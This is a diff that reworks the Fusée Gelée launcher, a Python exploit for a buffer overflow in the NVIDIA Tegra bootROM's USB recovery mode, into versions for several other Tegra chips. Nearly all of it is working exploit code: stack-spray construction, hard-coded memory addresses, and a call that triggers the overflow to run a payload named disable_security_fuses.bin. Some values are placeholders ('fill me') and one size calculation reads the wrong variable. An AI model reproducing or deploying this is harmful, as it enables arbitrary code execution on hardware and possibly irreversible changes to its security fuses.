@@ -1,31 +1,4 @@
 #!/usr/bin/env python3
-#
-# fusée gelée
-#
-# Launcher for the {re}switched coldboot/bootrom hacks--
-# launches payloads above the Horizon
-#
-# discovery and implementation by @ktemkin
-# likely independently discovered by lots of others <3
-#
-# this code is political -- it stands with those who fight for LGBT rights
-# don't like it? suck it up, or find your own damned exploit ^-^
-#
-# special thanks to:
-#    ScirèsM, motezazer -- guidance and support
-#    hedgeberg, andeor  -- dumping the Jetson bootROM
-#    TuxSH              -- for IDB notes that were nice to peek at
-#
-# much love to:
-#    Aurora Wright, Qyriad, f916253, MassExplosion213, and Levi
-#
-# greetings to:
-#    shuffle2
-
-# This file is part of Fusée Launcher
-# Copyright (C) 2018 Mikaela Szekely <qyriad@gmail.com>
-# Copyright (C) 2018 Kate Temkin <k@ktemkin.com>
-# Fusée Launcher is licensed under the terms of the GNU GPLv2
 
 import os
 import sys
@@ -34,22 +7,14 @@ import ctypes
 import argparse
 import platform
 
-# The address where the RCM payload is placed.
-# This is fixed for most device.
-RCM_PAYLOAD_ADDR    = 0x40010000
+IRAM_END = 0x40040000
 
-# The address where the user payload is expected to begin.
-PAYLOAD_START_ADDR  = 0x40010E40
+RCM_V1_HEADER_SIZE = 116
+RCM_V35_HEADER_SIZE = 628
+RCM_V40_HEADER_SIZE = 644
+RCM_V4P_HEADER_SIZE = 680
 
-# Specify the range of addresses where we should inject oct
-# payload address.
-STACK_SPRAY_START   = 0x40014E40
-STACK_SPRAY_END     = 0x40017000
 
-# notes:
-# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
-# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
-# GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>
 
 class HaxBackend:
     """
@@ -71,11 +36,6 @@ class HaxBackend:
     def __init__(self, skip_checks=False):
         """ Sets up the backend for the given device. """
         self.skip_checks = skip_checks
-
-
-    def print_warnings(self):
-        """ Print any warnings necessary for the given backend. """
-        pass
 
 
     def trigger_vulnerability(self, length):
@@ -115,7 +75,7 @@ class HaxBackend:
 
     def read(self, length):
         """ Reads data from the RCM protocol endpoint. """
-        return bytes(self.dev.read(0x81, length, 1000))
+        return bytes(self.dev.read(0x81, length, 3000))
 
 
     def write_single_buffer(self, data):
@@ -124,7 +84,7 @@ class HaxBackend:
         The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
         If it's not, send a ZLP.
         """
-        return self.dev.write(0x01, data, 1000)
+        return self.dev.write(0x01, data, 3000)
 
 
     def find_device(self, vid=None, pid=None):
@@ -134,24 +94,6 @@ class HaxBackend:
 
         self.dev = usb.core.find(idVendor=vid, idProduct=pid)
         return self.dev
-
-
-class MacOSBackend(HaxBackend):
-    """
-    Simple vulnerability trigger for macOS: we simply ask libusb to issue
-    the broken control request, and it'll do it for us. :)
-
-    We also support platforms with a hacked libusb and FreeBSD.
-    """
-
-    BACKEND_NAME = "macOS"
-    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos', 'FreeBSD']
-
-    def trigger_vulnerability(self, length):
-
-        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
-        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
-
 
 
 class LinuxBackend(HaxBackend):
@@ -189,13 +131,6 @@ class LinuxBackend(HaxBackend):
             ('signr',         ctypes.c_uint),
             ('usercontext',   ctypes.c_void_p),
         ]
-
-
-    def print_warnings(self):
-        """ Print any warnings necessary for the given backend. """
-        print("\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.")
-        print("A good way to ensure you're likely using an XHCI backend is to plug your")
-        print("device into a blue 'USB 3' port.\n")
 
 
     def trigger_vulnerability(self, length):
@@ -296,155 +231,10 @@ class LinuxBackend(HaxBackend):
             raw = f.read()
             return int(raw)
 
-class WindowsBackend(HaxBackend):
-    """
-    Use libusbK for most of it, and use the handle libusbK gets for us to call kernel32's DeviceIoControl
-    """
-
-    BACKEND_NAME = "Windows"
-    SUPPORTED_SYSTEMS = ["Windows"]
-
-    # Windows and libusbK specific constants
-    WINDOWS_FILE_DEVICE_UNKNOWN = 0x00000022
-    LIBUSBK_FUNCTION_CODE_GET_STATUS = 0x807
-    WINDOWS_METHOD_BUFFERED = 0
-    WINDOWS_FILE_ANY_ACCESS = 0
-
-    RAW_REQUEST_STRUCT_SIZE = 24 # 24 is how big the struct is, just trust me
-    TO_ENDPOINT = 2
-
-    # Yoinked (with love) from Windows' CTL_CODE macro
-    def win_ctrl_code(self, DeviceType, Function, Method, Access):
-        """ Return a control code for use with DeviceIoControl() """
-        return ((DeviceType) << 16 | ((Access) << 14) | ((Function)) << 2 | (Method))
-
-    def __init__(self, skip_checks):
-        import libusbK
-        self.libk = libusbK
-        # Grab libusbK
-        self.lib = ctypes.cdll.libusbK
-
-
-    def find_device(self, Vid, Pid):
-        """
-        Windows version of this function
-        Its return isn't actually significant, but it needs to be not None
-        """
-
-        # Get a list of devices to use later
-        device_list = self.libk.KLST_HANDLE()
-        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
-        ret = self.lib.LstK_Init(ctypes.byref(device_list), 0)
-
-        if ret == 0:
-            raise ctypes.WinError()
-
-        # Get info for a device with that vendor ID and product ID
-        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
-        ret = self.lib.LstK_FindByVidPid(device_list, Vid, Pid, ctypes.byref(device_info))
-        self.lib.LstK_Free(ctypes.byref(device_list))
-        if device_info is None or ret == 0:
-            return None
-
-        # Populate function pointers for use with the driver our device uses (which should be libusbK)
-        self.dev = self.libk.KUSB_DRIVER_API()
-        ret = self.lib.LibK_LoadDriverAPI(ctypes.byref(self.dev), device_info.contents.DriverID)
-        if ret == 0:
-            raise ctypes.WinError()
-
-        # Initialize the driver for use with our device
-        self.handle = self.libk.KUSB_HANDLE(None)
-        ret = self.dev.Init(ctypes.byref(self.handle), device_info)
-        if ret == 0:
-            raise self.libk.WinError()
-
-        return self.dev
-
-
-    def read(self, length):
-        """ Read using libusbK """
-        # Create the buffer to store what we read
-        buffer = ctypes.create_string_buffer(length)
-
-        len_transferred = ctypes.c_uint(0)
-
-        # Call libusbK's ReadPipe using our specially-crafted function pointer and the opaque device handle
-        ret = self.dev.ReadPipe(self.handle, ctypes.c_ubyte(0x81), ctypes.addressof(buffer), ctypes.c_uint(length), ctypes.byref(len_transferred), None)
-
-        if ret == 0:
-            raise ctypes.WinError()
-
-        return buffer.raw
-
-    def write_single_buffer(self, data):
-        """ Write using libusbK """
-        # Copy construct to a bytearray so we Know™ what type it is
-        buffer = bytearray(data)
-
-        # Convert wrap the data for use with ctypes
-        cbuffer = (ctypes.c_ubyte * len(buffer))(*buffer)
-
-        len_transferred = ctypes.c_uint(0)
-
-        # Call libusbK's WritePipe using our specially-crafted function pointer and the opaque device handle
-        ret = self.dev.WritePipe(self.handle, ctypes.c_ubyte(0x01), cbuffer, len(data), ctypes.byref(len_transferred), None)
-        if ret == 0:
-            raise ctypes.WinError()
-
-    def ioctl(self, driver_handle: ctypes.c_void_p, ioctl_code: ctypes.c_ulong, input_bytes: ctypes.c_void_p, input_bytes_count: ctypes.c_size_t, output_bytes: ctypes.c_void_p, output_bytes_count: ctypes.c_size_t):
-        """ Wrapper for DeviceIoControl """
-        overlapped = self.libk.OVERLAPPED()
-        ctypes.memset(ctypes.addressof(overlapped), 0, ctypes.sizeof(overlapped))
-
-        ret = ctypes.windll.kernel32.DeviceIoControl(driver_handle, ioctl_code, input_bytes, input_bytes_count, output_bytes, output_bytes_count, None, ctypes.byref(overlapped))
-
-        # We expect this to error, which matches the others ^_^
-        if ret == False:
-            raise ctypes.WinError()
-
-    def trigger_vulnerability(self, length):
-        """
-        Go over libusbK's head and get the master handle it's been using internally
-        and perform a direct DeviceIoControl call to the kernel to skip the length check
-        """
-        # self.handle is KUSB_HANDLE, cast to KUSB_HANDLE_INTERNAL to transparent-ize it
-        internal = ctypes.cast(self.handle, ctypes.POINTER(self.libk.KUSB_HANDLE_INTERNAL))
-
-        # Get the handle libusbK has been secretly using in its ioctl calls this whole time
-        master_handle = internal.contents.Device.contents.MasterDeviceHandle
-
-        if master_handle is None or master_handle == self.libk.INVALID_HANDLE_VALUE:
-            raise ValueError("Failed to initialize master handle")
-
-        # the raw request struct is pretty annoying, so I'm just going to allocate enough memory and set the few fields I need
-        raw_request = ctypes.create_string_buffer(self.RAW_REQUEST_STRUCT_SIZE)
-
-        # set timeout to 1000 ms, timeout offset is 0 (since it's the first member), and it's an unsigned int
-        timeout_p = ctypes.cast(raw_request, ctypes.POINTER(ctypes.c_uint))
-        timeout_p.contents = ctypes.c_ulong(1000) # milliseconds
-
-        status_p = ctypes.cast(ctypes.byref(raw_request, 4), ctypes.POINTER(self.libk.status_t))
-        status_p.contents.index = self.GET_STATUS
-        status_p.contents.recipient = self.TO_ENDPOINT
-
-        buffer = ctypes.create_string_buffer(length)
-
-        code = self.win_ctrl_code(self.WINDOWS_FILE_DEVICE_UNKNOWN, self.LIBUSBK_FUNCTION_CODE_GET_STATUS, self.WINDOWS_METHOD_BUFFERED, self.WINDOWS_FILE_ANY_ACCESS)
-        ret = self.ioctl(master_handle, ctypes.c_ulong(code), raw_request, ctypes.c_size_t(24), buffer, ctypes.c_size_t(length))
-
-        if ret == False:
-            raise ctypes.WinError()
-
 
 class RCMHax:
 
-    # Default to the Nintendo Switch RCM VID and PID.
-    DEFAULT_VID = 0x0955
-    DEFAULT_PID = 0x7321
-
-    # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
-    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.
+    
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
         """ Set up our RCM hack connection."""
@@ -477,9 +267,6 @@ class RCMHax:
             # ... or bail out.
             else:
                 raise IOError("No TegraRCM device found?")
-
-        # Print any use-related warnings.
-        self.backend.print_warnings()
 
         # Notify the user of which backend we're using.
         print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))
@@ -555,43 +342,220 @@ class RCMHax:
 
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
-            length = self.STACK_END - self.get_current_buffer_address()
+            length = self.STACK_END - self.get_current_buffer_address() - 0x20
 
         return self.backend.trigger_vulnerability(length)
 
+    def create_rcm_message(self):
+        ######## CREATE RCM HEADER #####################################################
+        # The max payload size depends on the address of the RCM Payload buffer
+        # Add the RCM header size to USB transfer size.
+        # Substract 16. IDK they all do it. Test without it.
+        rcm_header_length  = (IRAM_END - self.RCM_PAYLOAD_ADDR) + self.RCM_HEADER_SIZE - 16
+        rcm_header = rcm_header_length.to_bytes(4, byteorder='little')
+        # pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
+        rcm_header += b'\0' * (self.RCM_HEADER_SIZE - len(rcm_header))
 
-def parse_usb_id(id):
-    """ Quick function to parse VID/PID arguments. """
-    return int(id, 16)
+        rcm_message = rcm_header
+        print("End of RCM header: " + str(len(rcm_message)))
+        ######## INTERMEZZO ############################################################
+        intermezzo_size = 0
+        intermezzo_path = "./intermezzo.bin"
+        with open(intermezzo_path, "rb") as f:
+            intermezzo      = f.read()
+            intermezzo_size = len(intermezzo)
+            rcm_message        += intermezzo
+        print("End of Intermezzo: " + str(len(rcm_message)))
 
-# Read our arguments.
-parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
-parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
-parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
-parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
-parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
-parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
-parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
-parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
-parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
-arguments = parser.parse_args()
+        ######## PAD UNTIL PAYLOAD ADDRESS #############################################
+        padding_size = (self.PAYLOAD_START_ADDR - self.RCM_PAYLOAD_ADDR) - len(rcm_message) + self.RCM_HEADER_SIZE
+        padding = b'\0' * padding_size
 
-# Expand out the payload path to handle any user-refrences.
-payload_path = os.path.expanduser(arguments.payload)
-if not os.path.isfile(payload_path):
-    print("Invalid payload path specified!")
-    sys.exit(-1)
+        rcm_message += padding
+        print("End of Padding: " + str(len(rcm_message)) + " / " +hex(len(rcm_message)))
 
-# Find our intermezzo relocator...
-intermezzo_path = os.path.expanduser(arguments.relocator)
-if not os.path.isfile(intermezzo_path):
-    print("Could not find the intermezzo interposer. Did you build it?")
-    sys.exit(-1)
+        ######## PAYLOAD ###############################################################
+        payload_size = 0
+        payload_path = "./disable_security_fuses.bin"
+        with open(payload_path, "rb") as f:
+            payload      = f.read()
+            payload_size = len(intermezzo)
+            rcm_message        += payload
+        print("End of Payload: " + str(len(rcm_message)))
+
+        ######## PAD UNTIL STACK SPRAY ADDRESS #########################################
+        padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_message) + self.RCM_HEADER_SIZE
+        padding = b'\0' * padding_size
+
+        rcm_message += padding
+        print("End of Padding: " + str(len(rcm_message)) + " / " + hex(len(rcm_message)))
+
+        ######## STACK SPRAY ADDRESS ###################################################
+        repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
+        stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+
+        rcm_message += stack_spray
+        print("End of Stackspray: " + str(len(rcm_message)) + " / " + hex(len(rcm_message)))
+
+        ######## PAD TO MAX TRANSFER SIZE ##############################################
+        # Pad the payload to fill a USB request exactly, so we don't send a short
+        # packet and break out of the RCM loop.
+        payload_length = len(rcm_message)
+        print("final: " + hex(payload_length))
+        if (payload_length % 0x1000) != 0: #don't pad if we already end at correct alignment
+            padding_size   = 0x1000 - (payload_length % 0x1000)
+            rcm_message += (b'\0' * padding_size)
+
+        print("End of Padding: " + str(len(rcm_message)) + " / " + hex(len(rcm_message)))
+
+
+        rcm_payload = open("rcm_payload_new.bin", "wb")
+        # write to file
+        rcm_payload.write(rcm_message)
+        
+        return rcm_message
+
+class T20(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        self.DEFAULT_PID = 0x0000 #fill me
+
+        self.RCM_HEADER_SIZE  = RCM_V1_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x40008000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40005000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # 512 Byte should be enough? #0x40009E40
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
+
+class T30(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        # SURFACE_RT_PID 0x7130
+        # NEXUS7_PID 0x7330
+        self.DEFAULT_PID = 0x7130
+
+        self.RCM_HEADER_SIZE  = RCM_V1_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x4000A000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40005000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # 512 Byte should be enough? #0x40009E40
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
+
+class T114(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        self.DEFAULT_PID = 0x0000 # fill me
+
+        self.RCM_HEADER_SIZE  = RCM_V35_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x4000E000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # 512 Byte should be enough? #0x40009E40
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
+
+class T124(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        # JETSON_TK1_PID 0x7140
+        # SHIELD_TK1_PID 0x7f40
+        self.DEFAULT_PID = 0x0000 # fill me
+
+        self.RCM_HEADER_SIZE  = RCM_V40_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x4000E000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
+
+class T132(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        # NEXUS9__PID 0x7F13
+        self.DEFAULT_PID = 0x0000 # fill me
+
+        self.RCM_HEADER_SIZE  = RCM_V40_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x4000F000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
+
+class T210(RCMHax):
+
+    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
+        # Default to T30 RCM VID and PID.
+        self.DEFAULT_VID = 0x0955
+        # SWITCH_TX1_PID 0x7321
+        self.DEFAULT_PID = 0x0000 # fill me
+
+        self.RCM_HEADER_SIZE  = RCM_V4P_HEADER_SIZE
+        self.RCM_PAYLOAD_ADDR = 0x40010000
+
+        self.COPY_BUFFER_ADDRESSES   = [0, 0x40009000] # Lower Buffer doesn't matter
+
+        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
+        self.STACK_SPRAY_END     = self.STACK_END
+        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough
+
+        # The address where the user payload is expected to begin.
+        # A reasonable offset allows Intermezzo to grow without problems
+        self.PAYLOAD_START_ADDR  = self.RCM_PAYLOAD_ADDR + 0xE40 #+3648
+
+        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)
 
 # Get a connection to our device.
 try:
-    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
-            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
+    switch = T30()
 except IOError as e:
     print(e)
     sys.exit(-1)
@@ -602,72 +566,19 @@ try:
     print("Found a Tegra with Device ID: {}".format(device_id))
 except OSError as e:
     # Raise the exception only if we're not being permissive about ID reads.
-    if not arguments.permissive_id:
-        raise e
+    raise e
 
 
-# Prefix the image with an RCM command, so it winds up loaded into memory
-# at the right location (0x40010000).
-
-# Use the maximum length accepted by RCM, so we can transmit as much payload as
-# we want; we'll take over before we get to the end.
-length  = 0x30298
-payload = length.to_bytes(4, byteorder='little')
-
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
-
-# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
-# We'll use this data to smash the stack when we execute the vulnerable memcpy.
-print("\nSetting ourselves up to smash the stack...")
-
-# Include the Intermezzo binary in the command stream. This is our first-stage
-# payload, and it's responsible for relocating the final payload to 0x40010000.
-intermezzo_size = 0
-with open(intermezzo_path, "rb") as f:
-    intermezzo      = f.read()
-    intermezzo_size = len(intermezzo)
-    payload        += intermezzo
 
 
-# Pad the payload till the start of the user payload.
-padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
-payload += (b'\0' * padding_size)
+rcm_message = switch.create_rcm_message()
 
-target_payload = b''
 
-# Read the user payload into memory.
-with open(payload_path, "rb") as f:
-    target_payload = f.read()
-
-# Fit a collection of the payload before the stack spray...
-padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
-payload += target_payload[:padding_size]
-
-# ... insert the stack spray...
-repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
-payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
-
-# ... and follow the stack spray with the remainder of the payload.
-payload += target_payload[padding_size:]
-
-# Pad the payload to fill a USB request exactly, so we don't send a short
-# packet and break out of the RCM loop.
-payload_length = len(payload)
-padding_size   = 0x1000 - (payload_length % 0x1000)
-payload += (b'\0' * padding_size)
-
-# Check to see if our payload packet will fit inside the RCM high buffer.
-# If it won't, error out.
-if len(payload) > length:
-    size_over = len(payload) - length
-    print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
-    sys.exit(errno.EFBIG)
 
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
 print("Uploading payload...")
-switch.write(payload)
+switch.write(rcm_message)
 
 # The RCM backend alternates between two different DMA buffers. Ensure we're
 # about to DMA into the higher one, so we have less to copy during our attack.
